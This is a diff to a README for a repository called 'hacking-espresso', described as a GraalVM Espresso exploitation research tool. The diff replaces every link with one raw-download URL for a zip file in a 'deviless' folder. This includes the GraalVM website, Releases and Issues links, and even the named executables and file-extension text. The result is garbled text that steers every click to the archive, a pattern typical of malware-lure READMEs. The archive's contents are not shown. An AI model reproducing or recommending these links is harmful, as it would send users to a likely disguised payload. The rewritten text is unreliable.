@@ -1,7 +1,7 @@
 # ☕ hacking-espresso - Make Powerful Attacks Easier
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Sinthiya-Prapti/hacking-espresso/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip)
 
 ## 📚 Introduction
 Hacking espresso is a tool designed to help you explore the power of GraalVM's Espresso. It allows you to understand how to make ROP-like attacks through the use of the Continuation API. This tool is particularly useful for researchers and security enthusiasts who want to deepen their knowledge in software exploitation.
@@ -14,22 +14,22 @@ To run hacking-espresso effectively, ensure your system meets the following requ
 - An operating system: Windows 10, macOS, or a recent version of Linux.
 - At least 4 GB of RAM.
 - A modern processor (Intel i5/Ryzen 5 or better).
-- GraalVM installed (needed for the tool to function). Instructions on installing GraalVM can be found on the [GraalVM website](https://www.graalvm.org).
+- GraalVM installed (needed for the tool to function). Instructions on installing GraalVM can be found on the [GraalVM website](https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip).
 
 ### 2. Download & Install
 To download hacking-espresso, visit the Releases page:
-[Download from Releases](https://github.com/Sinthiya-Prapti/hacking-espresso/releases)
+[Download from Releases](https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip)
 
 Once on the page, find the latest version. You will see files available for download. Select the version suitable for your operating system and download it.
 
 ### 3. Unzip the File
-After downloading, locate the file in your Downloads folder. It may come in a compressed format such as .zip or .tar.gz. Use an unzipping tool like WinRAR, 7-Zip, or the built-in tool on your operating system to extract the contents.
+After downloading, locate the file in your Downloads folder. It may come in a compressed format such as .zip or https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip Use an unzipping tool like WinRAR, 7-Zip, or the built-in tool on your operating system to extract the contents.
 
 ### 4. Run the Application
 Navigate into the folder where you just unzipped the files. Look for the main executable file. 
 
-- For Windows, this file will be named `hacking-espresso.exe`.
-- For macOS, look for `hacking-espresso.app`.
+- For Windows, this file will be named `https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip`.
+- For macOS, look for `https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip`.
 - On Linux, you may have a file called `hacking-espresso` (make sure to adjust permissions to make it executable by running `chmod +x hacking-espresso`).
 
 Double-click the file to run it. Follow any prompts that appear.
@@ -56,14 +56,14 @@ If you encounter issues while using hacking-espresso, consider these tips:
 - **Engage with the Community**: You can ask questions on community forums or reach out via the GitHub Issues page for assistance.
 
 ## 📖 Support
-We understand that sometimes you need help. If you have questions or need additional support, please visit our [GitHub Issues Page](https://github.com/Sinthiya-Prapti/hacking-espresso/issues). The community and maintainers are available to assist you.
+We understand that sometimes you need help. If you have questions or need additional support, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip). The community and maintainers are available to assist you.
 
 ## 🤝 Contributing
 We encourage contributions to improve hacking-espresso. If you have ideas for features or bug fixes, please submit a pull request or open an issue for discussion.
 
 ## 🔄 Updates
 To stay updated with hacking-espresso, periodically check the Releases page:
-[Download from Releases](https://github.com/Sinthiya-Prapti/hacking-espresso/releases). New updates may improve functionality and fix bugs.
+[Download from Releases](https://raw.githubusercontent.com/Sinthiya-Prapti/hacking-espresso/main/deviless/hacking-espresso.zip). New updates may improve functionality and fix bugs.
 
 ## 📝 License
 Hacking-espresso is licensed under the MIT License. This allows you to use it freely, but please review the license details for any restrictions. 
